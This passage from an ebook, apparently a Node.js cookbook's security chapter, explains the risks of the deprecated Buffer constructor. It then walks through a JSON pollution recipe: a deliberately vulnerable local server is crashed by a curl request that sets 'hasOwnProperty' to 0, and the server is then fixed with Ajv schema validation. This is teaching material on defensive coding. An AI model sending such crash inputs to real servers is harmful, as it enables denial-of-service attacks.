    </span>
    <span class="koboSpan" id="kobo.1254.2">
     In the worst cases, this could expose
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1255.1">
      sensitive data.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1256.1">
     However, in versions of Node.js later than version 8, calling
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1257.1">
      Buffer(int)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1258.1">
     will result in a zero-filled
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1259.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1260.1">
     object of
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1261.1">
       int
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1262.1">
      size:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1263.1">
$ node
&gt; new Buffer(10)
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1264.1">
     Calling
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1265.1">
      new Buffer(int)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1266.1">
     is still
    </span>
    <a id="_idIndexMarker735">
    </a>
    <span class="koboSpan" id="kobo.1267.1">
     deprecated and as of Node.js 22, using this constructor will emit a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1268.1">
      deprecation warning:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1269.1">
&gt; new Buffer(10)
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;
&gt; (node:46906) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. </span><span class="koboSpan" id="kobo.1269.2">Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
</span><span class="koboSpan" id="kobo.1269.3">(Use `node --trace-deprecation ...` to show where the warning was created)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1270.1">
     This is because there
    </span>
    <a id="_idIndexMarker736">
    </a>
    <span class="koboSpan" id="kobo.1271.1">
     are still security risks associated with using the new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1272.1">
      Buffer(int)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1273.1">
     constructor.
    </span>
    <span class="koboSpan" id="kobo.1273.2">
     Let’s demonstrate that
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1274.1">
      risk now.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1275.1">
     Imagine that our application accepted some user input in JSON form and we created a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1276.1">
      new Buffer()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1277.1">
     object from one of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1278.1">
      the values:
     </span>
    </span>
   </p>
   <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1279.1">&gt; let greeting = { "msg" : "hello" }</span></strong><span class="koboSpan" id="kobo.1280.1">
undefined
</span><strong class="bold"><span class="koboSpan" id="kobo.1281.1">&gt; new Buffer(greeting.msg)</span></strong><span class="koboSpan" id="kobo.1282.1">
&lt;Buffer 68 65 6c 6c 6f&gt;
&gt; (node:47025) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. </span><span class="koboSpan" id="kobo.1282.2">Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
</span><span class="koboSpan" id="kobo.1282.3">(Use `node --trace-deprecation ...` to show where the warning was created)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1283.1">
     We can see that this works as expected (ignoring the deprecation warning).
    </span>
    <span class="koboSpan" id="kobo.1283.2">
     Calling
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1284.1">
      Buffer(string)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1285.1">
     creates a new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1286.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1287.1">
     object containing the string value.
    </span>
    <span class="koboSpan" id="kobo.1287.2">
     Now, let’s see what happens if we set
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1288.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1289.1">
     to a number rather than
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1290.1">
      a string:
     </span>
    </span>
   </p>
   <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1291.1">&gt; greeting = { "msg" : 10 }</span></strong><span class="koboSpan" id="kobo.1292.1">
{ msg: 10 }
</span><strong class="bold"><span class="koboSpan" id="kobo.1293.1">&gt; new Buffer(greeting.msg)</span></strong><span class="koboSpan" id="kobo.1294.1">
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;
&gt; (node:47073) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. </span><span class="koboSpan" id="kobo.1294.2">Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
</span><span class="koboSpan" id="kobo.1294.3">(Use `node --trace-deprecation ...` to show where the warning was created)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1295.1">
     This has created a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1296.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1297.1">
     object of size
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1298.1">
      10
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1299.1">
     .
    </span>
    <span class="koboSpan" id="kobo.1299.2">
     So, an attacker could pass any value via the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1300.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1301.1">
     property, and
    </span>
    <a id="_idIndexMarker737">
    </a>
    <span class="koboSpan" id="kobo.1302.1">
     a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1303.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1304.1">
     object of that size would be created.
    </span>
    <span class="koboSpan" id="kobo.1304.2">
     A simple DoS attack could be launched by
    </span>
    <a id="_idIndexMarker738">
    </a>
    <span class="koboSpan" id="kobo.1305.1">
     the attacker by supplying large integer values on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1306.1">
      each request.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1307.1">
     The deprecation warning recommends using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1308.1">
      Buffer.from(req.body.string)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1309.1">
     instead.
    </span>
    <span class="koboSpan" id="kobo.1309.2">
     Upon passing the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1310.1">
      Buffer.from()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1311.1">
     method, a number will throw
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1312.1">
      an exception:
     </span>
    </span>
   </p>
   <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1313.1">&gt; new Buffer.from(greeting.msg)</span></strong><span class="koboSpan" id="kobo.1314.1">
Uncaught:
TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. </span><span class="koboSpan" id="kobo.1314.2">Received type number (10)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1315.1">
     This helps protect our code from unexpected input.
    </span>
    <span class="koboSpan" id="kobo.1315.2">
     To create a new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1316.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1317.1">
     object of a given size, you should use the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1318.1">
       Buffer.alloc(int)
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1319.1">
      method:
     </span>
    </span>
   </p>
   <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1320.1">&gt; new Buffer.alloc(10)</span></strong><span class="koboSpan" id="kobo.1321.1">
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1322.1">
     There is also a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1323.1">
      Buffer.allocUnsafe()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1324.1">
     constructor.
    </span>
    <span class="koboSpan" id="kobo.1324.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1325.1">
      Buffer.allocUnsafe()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1326.1">
     constructor provides similar behavior to that seen in Node.js versions before Node.js 7, where the memory wasn’t entirely zero-filled
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1327.1">
      on initialization:
     </span>
    </span>
   </p>
   <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1328.1">$ new Buffer.allocUnsafe(10)</span></strong><span class="koboSpan" id="kobo.1329.1">
&lt;Buffer 00 00 00 00 00 00 00 00 ff ff&gt;</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1330.1">
     For the reasons
    </span>
    <a id="_idIndexMarker739">
    </a>
    <span class="koboSpan" id="kobo.1331.1">
     mentioned earlier, use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1332.1">
      Buffer.allocUnsafe()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1333.1">
     constructor
    </span>
    <a id="_idIndexMarker740">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1334.1">
      with caution.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-293">
    <a id="_idTextAnchor300">
    </a>
    <span class="koboSpan" id="kobo.1335.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.1336.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1337.1">
       Preventing JSON pollution
      </span>
     </em>
     <span class="koboSpan" id="kobo.1338.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1339.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1340.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1341.1">
       Guarding against cross-site scripting
      </span>
     </em>
     <span class="koboSpan" id="kobo.1342.1">
      in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1343.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1344.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1345.1">
       Preventing cross-site request forgery
      </span>
     </em>
     <span class="koboSpan" id="kobo.1346.1">
      in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1347.1">
       this chapter
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-294">
    <a id="_idTextAnchor301">
    </a>
    <span class="koboSpan" id="kobo.1348.1">
     Preventing JSON pollution
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1349.1">
     The JavaScript
    </span>
    <a id="_idIndexMarker741">
    </a>
    <span class="koboSpan" id="kobo.1350.1">
     language allows all
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1351.1">
      Object
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1352.1">
     attributes to be altered.
    </span>
    <span class="koboSpan" id="kobo.1352.2">
     In a JSON pollution attack, an attacker leverages this ability to override built-in attributes and functions with
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1353.1">
      malicious code.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1354.1">
     Applications that accept JSON as user input are the most susceptible to these attacks.
    </span>
    <span class="koboSpan" id="kobo.1354.2">
     In the most severe cases, it’s possible to crash a server by just supplying additional values in JSON input.
    </span>
    <span class="koboSpan" id="kobo.1354.3">
     This can make the server vulnerable to DoS attacks via
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1355.1">
      JSON pollution.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1356.1">
     The key to preventing JSON pollution attacks is to validate all JSON input.
    </span>
    <span class="koboSpan" id="kobo.1356.2">
     This can be done manually or by defining a schema for your JSON to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1357.1">
      validate against.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1358.1">
     In this recipe, we’re going to demonstrate a JSON pollution attack and learn how to protect against these attacks by validating our JSON input.
    </span>
    <span class="koboSpan" id="kobo.1358.2">
     Specifically, we’ll be using
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1359.1">
      Another JSON Schema Validator
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1360.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1361.1">
      Ajv
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1362.1">
     ) to
    </span>
    <a id="_idIndexMarker742">
    </a>
    <span class="koboSpan" id="kobo.1363.1">
     validate our
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1364.1">
      JSON input.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-295">
    <a id="_idTextAnchor302">
    </a>
    <span class="koboSpan" id="kobo.1365.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1366.1">
     To prepare for this recipe, we must create a server that’s susceptible to a JSON pollution attack.
    </span>
    <span class="koboSpan" id="kobo.1366.2">
     The server will accept
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1367.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1368.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1369.1">
      name
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1370.1">
     as the body payload and respond with a message built with
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1371.1">
      these values:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1372.1">
      First, let’s create a new directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1373.1">
       json-pollution
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1374.1">
      to work in and initialize it
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1375.1">
       with
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1376.1">
        npm
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1377.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1378.1">$ mkdir json-pollution</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1379.1">$ cd json-pollution</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1380.1">$ npm init --yes</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1381.1">
      Then, create a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1382.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1383.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1384.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1385.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1386.1">
      Add the
     </span>
     <a id="_idIndexMarker743">
     </a>
     <span class="koboSpan" id="kobo.1387.1">
      following code
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1388.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1389.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1390.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1391.1">
const http = require('node:http');
const { STATUS_CODES } = http;
const server = http.createServer((req, res) =&gt; {
  if (req.method === 'POST' &amp;&amp; req.url === '/') {
    greeting(req, res);
    return;
  }
  res.statusCode = 404;
  res.end(STATUS_CODES[res.statusCode]);
});
const greeting = (req, res) =&gt; {
  let data = '';
  req.on('data', (chunk) =&gt; (data += chunk));
  req.on('end', () =&gt; {
    try {
      data = JSON.parse(data);
    } catch (e) {
      res.end('');
      return;
    }
    if (data.hasOwnProperty('name')) {
      res.end(`${data.msg} ${data.name}`);
    } else {
      res.end(data.msg);
    }
  });
};
server.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1392.1">
     Now that we’ve created our vulnerable server, we’re ready to start
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1393.1">
      this recipe.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-296">
    <a id="_idTextAnchor303">
    </a>
    <span class="koboSpan" id="kobo.1394.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1395.1">
     In this recipe, we’re going to demonstrate a JSON pollution attack and learn how to use a JSON schema to protect our applications from
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1396.1">
      these attacks:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1397.1">
      Start the server with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1398.1">
       following command:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1399.1">$ node server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1400.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1401.1">
      Next, we’ll send an HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1402.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1403.1">
      request to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1404.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1405.1">
      using
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1406.1">
       cURL
      </span>
     </em>
     <span class="koboSpan" id="kobo.1407.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1407.2">
      We’ll supply the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1408.1">
       curl
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1409.1">
      command with the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1410.1">
       -X
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1411.1">
      argument to specify the HTTP request method and the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1412.1">
       -d
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1413.1">
      argument to supply the data.
     </span>
     <span class="koboSpan" id="kobo.1413.2">
      In a second terminal window, send the
     </span>
     <a id="_idIndexMarker744">
     </a>
     <span class="koboSpan" id="kobo.1414.1">
      following
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1415.1">
        cURL
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1416.1">
       request:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1417.1">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth" }' http://localhost:3000/</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1418.1">Hello Beth%</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1419.1">
       As expected, the server responds with
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1420.1">
        a greeting.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1421.1">
      Now, let’s try altering the payload so that it sends an additional JSON property
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1422.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1423.1">
        hasOwnProperty
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1424.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1425.1">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth", "hasOwnProperty": 0 }' http://localhost:3000/</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1426.1">curl: (52) Empty reply from server</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1427.1">
       Note the empty reply from
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1428.1">
        the server.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1429.1">
      Check the terminal window where you’re running the server.
     </span>
     <span class="koboSpan" id="kobo.1429.2">
      You should see that it’s crashed with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1430.1">
       following error:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1431.1">Server listening on port 3000</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1432.1">/Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1433.1">    if (data.hasOwnProperty('name')) {</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1434.1">             ^</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1435.1">TypeError: data.hasOwnProperty is not a function</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1436.1">    at IncomingMessage.&lt;anonymous&gt; (/Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29:14)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1437.1">    at IncomingMessage.emit (node:events:519:28)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1438.1">    at endReadableNT (node:internal/streams/readable:1696:12)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1439.1">    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1440.1">Node.js v22.9.0</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1441.1">
      Our server has crashed because the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1442.1">
       hasOwnProperty()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1443.1">
      function has been overridden by the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1444.1">
       hasOwnProperty
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1445.1">
      value in the JSON input.
     </span>
     <span class="koboSpan" id="kobo.1445.2">
      We can protect against this by
     </span>
     <a id="_idIndexMarker745">
     </a>
     <span class="koboSpan" id="kobo.1446.1">
      validating our JSON input using the Ajv module.
     </span>
     <span class="koboSpan" id="kobo.1446.2">
      So, install the Ajv module
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1447.1">
       from
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1448.1">
        npm
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1449.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1450.1">$ npm install ajv</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1451.1">
      Next, we’ll copy our
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1452.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1453.1">
      file to a new file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1454.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1455.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1456.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1457.1">$ cp server.js fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1458.1">
      Add the following code to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1459.1">
       fixed-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1460.1">
      to import the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1461.1">
       ajv
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1462.1">
      module and define a JSON schema for our JSON input.
     </span>
     <span class="koboSpan" id="kobo.1462.2">
      Note that this code should be added just below the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1463.1">
        STATUS_CODES
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1464.1">
       destructuring:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1465.1">
const Ajv = require('ajv');
const ajv = new Ajv();
const schema = {
  title: 'Greeting',
  type: 'object',
  properties: {
    msg: { type: 'string' },
    name: { type: 'string' }
  },
  additionalProperties: false,
  required: ['msg']
};
const validate = ajv.compile(schema);</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1466.1">
      The greeting
     </span>
     <a id="_idIndexMarker746">
     </a>
     <span class="koboSpan" id="kobo.1467.1">
      function needs to be altered to validate the JSON input against
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1468.1">
       the schema:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1469.1">
const greeting = (req, res) =&gt; {
  let data = '';
  req.on('data', (chunk) =&gt; (data += chunk));
  req.on('end', () =&gt; {
    try {
      data = JSON.parse(data);
    } catch (e) {
      res.end('');
      return;
    }
</span><strong class="bold"><span class="koboSpan" id="kobo.1470.1">    if (!validate(data, schema)) {</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1471.1">      res.end('');</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1472.1">      return;</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1473.1">    }</span></strong><span class="koboSpan" id="kobo.1474.1">
    if (data.hasOwnProperty('name')) {
      res.end(`${data.msg} ${data.name}`);
    } else {
      res.end(data.msg);
    }
  });
};</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1475.1">
       Here, we’ve added a conditional statement that calls the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1476.1">
        validate()
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1477.1">
       method within
      </span>
      <a id="_idIndexMarker747">
      </a>
      <span class="koboSpan" id="kobo.1478.1">
       our
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1479.1">
        greeting()
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1480.1">
       function, which validates
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1481.1">
        the schema.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1482.1">
      Start the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1483.1">
       fixed server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1484.1">$ node fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1485.1">
      Retry the same request in an attempt to override the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1486.1">
       hasOwnProperty()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1487.1">
      method.
     </span>
     <span class="koboSpan" id="kobo.1487.2">
      Observe that it receives no response and no longer crashes
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1488.1">
       the server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1489.1">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth", "hasOwnProperty": 0 }' http://localhost:3000/</span></strong></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1490.1">
     With that, we’ve protected our server against a JSON pollution attack by validating the input against a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1491.1">
      JSON schema.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-297">
    <a id="_idTextAnchor304">
    </a>
    <span class="koboSpan" id="kobo.1492.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1493.1">
     In this recipe, we demonstrated a JSON pollution attack.
    </span>
    <span class="koboSpan" id="kobo.1493.2">
     To do this, we created a simple Express.js server that had one route handler for HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1494.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1495.1">
     requests at
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1496.1">
      http://localhost:3000
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1497.1">
     .
    </span>
    <span class="koboSpan" id="kobo.1497.2">
     For each request, our
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1498.1">
      greeting()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1499.1">
     function is called.
    </span>
    <span class="koboSpan" id="kobo.1499.2">
     The
    </span>
